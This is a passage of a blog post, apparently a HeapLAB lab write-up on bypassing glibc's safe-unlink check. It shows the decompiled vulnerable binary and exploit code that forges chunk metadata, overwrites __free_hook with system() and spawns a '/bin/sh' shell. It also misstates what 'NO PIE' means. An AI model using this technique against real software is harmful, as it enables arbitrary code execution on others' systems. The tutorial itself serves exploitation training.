+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> index; <span style="color:#6272a4">// [rsp+14h] [rbp-Ch]
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> n; <span style="color:#6272a4">// [rsp+18h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> na; <span style="color:#6272a4">// [rsp+18h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> nb; <span style="color:#6272a4">// [rsp+18h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">setvbuf</span>(stdout, <span style="color:#bd93f9">0LL</span>, <span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">0LL</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">===============&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;|   HeapLAB   |  Safe Unlink&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;===============</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;puts() @ %p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#ff79c6">&amp;</span>puts);
+</span></span><span style="display:flex;"><span>  index <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">while</span> ( <span style="color:#bd93f9">1</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">1) malloc %u/%u</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, index, <span style="color:#bd93f9">2LL</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;2) edit&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;3) free&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;4) target&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;5) quit&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">switch</span> ( <span style="color:#50fa7b">read_num</span>() )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">case</span> <span style="color:#bd93f9">1uLL</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( index <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">1</span> )
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;maximum requests reached&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span>
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;size: &#34;</span>);
+</span></span><span style="display:flex;"><span>          n <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">read_num</span>();
+</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">if</span> ( n <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0x78</span> <span style="color:#ff79c6">||</span> n <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0x3E8</span> )
+</span></span><span style="display:flex;"><span>          {
+</span></span><span style="display:flex;"><span>            <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;small chunks only - excluding fast sizes (120 &lt; bytes &lt;= 1000)&#34;</span>);
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">else</span>
+</span></span><span style="display:flex;"><span>          {
+</span></span><span style="display:flex;"><span>            m_array[index].user_data <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)<span style="color:#50fa7b">malloc</span>(n);
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> ( m_array[index].user_data )
+</span></span><span style="display:flex;"><span>              m_array[index<span style="color:#ff79c6">++</span>].request_size <span style="color:#ff79c6">=</span> n;
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">else</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;request failed&#34;</span>);
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">continue</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">case</span> <span style="color:#bd93f9">2uLL</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;index: &#34;</span>);
+</span></span><span style="display:flex;"><span>        na <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">read_num</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( na <span style="color:#ff79c6">&gt;=</span> index )
+</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">goto</span> LABEL_15;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( m_array[na].user_data )
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;data: &#34;</span>);
+</span></span><span style="display:flex;"><span>          <span style="color:#50fa7b">read</span>(<span style="color:#bd93f9">0</span>, m_array[na].user_data, m_array[na].request_size <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">8</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span>
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;cannot edit a free chunk&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">case</span> <span style="color:#bd93f9">3uLL</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;index: &#34;</span>);
+</span></span><span style="display:flex;"><span>        nb <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">read_num</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( nb <span style="color:#ff79c6">&gt;=</span> index )
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">LABEL_15</span>:
+</span></span><span style="display:flex;"><span>          <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;invalid index&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> ( m_array[nb].user_data )
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          <span style="color:#50fa7b">free</span>(m_array[nb].user_data);
+</span></span><span style="display:flex;"><span>          m_array[nb].user_data <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0LL</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span>
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;this chunk was already freed&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">case</span> <span style="color:#bd93f9">4uLL</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">target: %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, target);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">case</span> <span style="color:#bd93f9">5uLL</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">exit</span>(<span style="color:#bd93f9">0</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">default</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">continue</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>One of <code>malloc</code>&rsquo;s small optimizations is that it doesn&rsquo;t directly keep track of all allocated chunks. Instead, it maintains pointers to the top chunks and free chunks within its arenas. When a chunk is allocated to a thread, it’s the thread&rsquo;s responsibility to hold onto the pointer to that chunk until it’s returned to <code>malloc</code> using functions like <code>free()</code>.</p>
+<p>This means a program must store pointers to allocated chunks somewhere, such as on the stack, in the data section, or even on the heap itself. In the vulnerable binaries we&rsquo;ve worked with so far, these chunk pointers are stored on the stack. Unfortunately, without a stack leak, we can&rsquo;t access or modify these pointers, making them out of reach.</p>
+<p>In the process of memory allocation in binary, the allocated memory is assigned to the <code>user_data</code> field of a specific structure in the <code>m_array</code>.</p>
+<p>The <code>m_array</code> structure manages pointers, each referencing allocated malloc chunks’ data sections.</p>
+<p><img src="image%2017.png" alt="image.png"></p>
+<p><code>m_array</code>  is located in binary, binary compiled without PIE, by <code>checks</code> command, we can see there is <strong>NO PIE.</strong> It means our binary is position-independent, which means the address of <code>m_array</code> is static and will not change in the runtime.</p>
+<p><img src="image%2018.png" alt="image.png"></p>
+<p>You might wonder why this address isn’t equal to <code>0x603000</code>, which is the pointer to the header of the first <code>malloc</code>. The reason is that it points to the user data of the first chunk instead. However, we can manipulate this behavior to bypass the mitigation.</p>
+<p>By crafting a fake header, we can adjust the pointer offset so that it aligns correctly. As a result, it will point directly to <code>0x603010</code>. Now, let’s modify the payload accordingly.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>chunk_A <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">malloc</span>(<span style="color:#bd93f9">0x88</span>)
+</span></span><span style="display:flex;"><span>chunk_B <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">malloc</span>(<span style="color:#bd93f9">0x88</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6"># Prepare fake chunk metadata.
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>fd <span style="color:#ff79c6">=</span> elf.sym.m_array <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x18</span> # fd<span style="color:#ff79c6">-&gt;</span>bk <span style="color:#ff79c6">==</span> p
+</span></span><span style="display:flex;"><span>bk <span style="color:#ff79c6">=</span> elf.sym.m_array <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x10</span> # bk<span style="color:#ff79c6">-&gt;</span>fd <span style="color:#ff79c6">==</span> p
+</span></span><span style="display:flex;"><span>prev_size <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x80</span>
+</span></span><span style="display:flex;"><span>fake_size <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x90</span>
+</span></span><span style="display:flex;"><span>fake_header <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">p64</span>(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">+</span> <span style="color:#50fa7b">p64</span>(<span style="color:#bd93f9">0x81</span>)
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">edit</span>(chunk_A, fake_header <span style="color:#ff79c6">+</span> <span style="color:#50fa7b">p64</span>(fd) <span style="color:#ff79c6">+</span> <span style="color:#50fa7b">p64</span>(bk) <span style="color:#ff79c6">+</span> <span style="color:#50fa7b">p8</span>(<span style="color:#bd93f9">0</span>)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x60</span> <span style="color:#ff79c6">+</span> <span style="color:#50fa7b">p64</span>(prev_size) <span style="color:#ff79c6">+</span> <span style="color:#50fa7b">p64</span>(fake_size))
+</span></span></code></pre></div><p>This is how fake header looks like</p>
+<p><img src="image%2019.png" alt="image.png"></p>
+<p><img src="image%2020.png" alt="image.png"></p>
+<p>Let’s break down the logic step by step:</p>
+<ol>
+<li>We begin by freeing the second chunk. The thread then checks the <code>prev_inuse</code> bit, which is set to <code>0x90</code>  quadwords and the last byte of this quadword is <code>0x0</code>. This indicates that the previous chunk is not in use, free.</li>
+<li>Because the previous chunk is marked as unused, the thread subtracts the <code>prev_size</code> value (<code>0x80</code>) from the current chunk’s address. This adjustment leads the thread to the fake header of our first chunk. If <code>prev_size</code> is greater than <code>size</code>, the process continues successfully to the next step.</li>
+<li>The <code>fd</code> pointer <code>0x602048</code>, is checked. It points to the fake forward chunk, where its <code>bk</code> pointer (<code>0x603010</code>) is verified to ensure it points back to our first allocated chunk. This check passes.</li>
+<li>Similarly, the <code>bk</code> pointer <code>0x602050</code>, is examined. It points to the fake backward chunk, and its <code>fd</code> pointer (<code>0x603010</code>) is checked to confirm it points forward to our first allocated chunk. This check also passes.</li>
+</ol>
+<p>With all validations completed, the mitigation is successfully bypassed. And we did arbitiry write we changed <code>m_array</code> ’s first chunk data pointer to our <code>fd</code> pointer address.</p>
+<p>Before free:</p>
+<p><img src="image%2021.png" alt="image.png"></p>
+<p>After free:</p>
+<p><img src="image%2022.png" alt="image.png"></p>
+<p>How <code>fd</code> <code>0x602048</code> address appear instead of <code>bk</code> address (as we see in the unsafe unlink example)?</p>
+<p>If you recall how the <code>unlink</code> operation works, in our case, we adjust relatively the <code>fd</code> and <code>bk</code> pointers so that only one address (<code>0x603010</code>) is changed during the process. Here&rsquo;s a breakdown of the logic:</p>
+<ol>
+<li>The <code>fd</code> and <code>bk</code> pointers are set as follows:
+<ul>
+<li><code>FD = P-&gt;fd</code></li>
+<li><code>BK = P-&gt;bk</code></li>
+</ul>
+</li>
+<li>During the unlink operation:
+<ul>
+<li>First, overwrite <code>FD-&gt;bk</code> to point to <code>p-&gt;bk</code>.</li>
+<li>Second, <code>BK-&gt;fd</code> be overwritten to point to <code>p-&gt;fd</code>.</li>
+</ul>
+</li>
+</ol>
+<p>The Last operation is the final swap, primarily writing to the <code>fd</code> pointers. This is why only the <code>fd</code> pointers are ultimately modified during the process and offsets <code>offset(FD-&gt;bk) = offset(BK-&gt;fd)</code>.</p>
+<p><img src="image%2023.png" alt="image.png"></p>
+<p>we changed <code>m_array[na].user_data</code>  address, it means in the next <strong>edit() we can manipulate which address to arbitiry write.</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>fd <span style="color:#ff79c6">=</span> elf.sym.m_array <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x18</span> # fd<span style="color:#ff79c6">-&gt;</span>bk <span style="color:#ff79c6">==</span> p
+</span></span><span style="display:flex;"><span>bk <span style="color:#ff79c6">=</span> elf.sym.m_array <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x10</span> # bk<span style="color:#ff79c6">-&gt;</span>fd <span style="color:#ff79c6">==</span> p
+</span></span><span style="display:flex;"><span>prev_size <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x80</span>
+</span></span><span style="display:flex;"><span>fake_size <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x90</span>
+</span></span><span style="display:flex;"><span>fake_header <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">p64</span>(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">+</span> <span style="color:#50fa7b">p64</span>(<span style="color:#bd93f9">0x81</span>)
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">edit</span>(chunk_A, fake_header <span style="color:#ff79c6">+</span> <span style="color:#50fa7b">p64</span>(fd) <span style="color:#ff79c6">+</span> <span style="color:#50fa7b">p64</span>(bk) <span style="color:#ff79c6">+</span> <span style="color:#50fa7b">p8</span>(<span style="color:#bd93f9">0</span>)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x60</span> <span style="color:#ff79c6">+</span> <span style="color:#50fa7b">p64</span>(prev_size) <span style="color:#ff79c6">+</span> <span style="color:#50fa7b">p64</span>(fake_size))
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">free</span>(chunk_B)
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">edit</span>(chunk_A, <span style="color:#50fa7b">p64</span>(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">3</span> <span style="color:#ff79c6">+</span> <span style="color:#50fa7b">p64</span>(libc.sym.__free_hook <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">8</span>))
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">edit</span>(<span style="color:#bd93f9">0</span>, b<span style="color:#f1fa8c">&#34;/bin/sh</span><span style="color:#f1fa8c">\0</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#50fa7b">p64</span>(libc.sym.system))
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">free</span>(<span style="color:#bd93f9">0</span>)
+</span></span></code></pre></div><p>To execute the exploit, we start by freeing the &ldquo;victim&rdquo; chunk, which triggers a backward consolidation with the &ldquo;overflow&rdquo; chunk. This manipulation allows us to set up the heap for further exploitation. After unlinking, the first entry in <code>m_array</code> is adjusted to point 0x18 bytes before <code>m_array</code> itself. Using the &ldquo;edit&rdquo; functionality, we overwrite this entry with the address of <code>__free_hook - 8</code>, carefully positioning it for our payload. Next, we use the &ldquo;edit&rdquo; option again to write the string &ldquo;/bin/sh&rdquo; just before the free hook and overwrite the free hook itself with the address of <code>system()</code>. Finally, freeing the first entry in <code>m_array</code>, which now holds the address of the &ldquo;/bin/sh&rdquo; string, triggers a call to <code>system(&quot;/bin/sh&quot;)</code>, effectively gaining a shell.</p>
+
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/unsafe-unlink">unsafe-unlink</a></li>
+					
+					<li><a href="/tags/linux">linux</a></li>
+					
+					<li><a href="/tags/glibc">glibc</a></li>
+					
+					<li><a href="/tags/malloc">malloc</a></li>
+					
+					<li><a href="/tags/exploitation">exploitation</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/arzedlab/" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a><a class="soc" href="https://www.linkedin.com/in/ravshan-rikhsiev/" rel="me" title="Linkedin"><i data-feather="linkedin"></i></a>
+    <a class="border"></a><a class="soc" href="https://twitter.com/arzedlab/" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2025  © Ravshan | Made with Love ❤️ <a href="https://twitter.com/arzedlab/"> My Twitter 🪽</a>
+  </div>
+</footer>
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
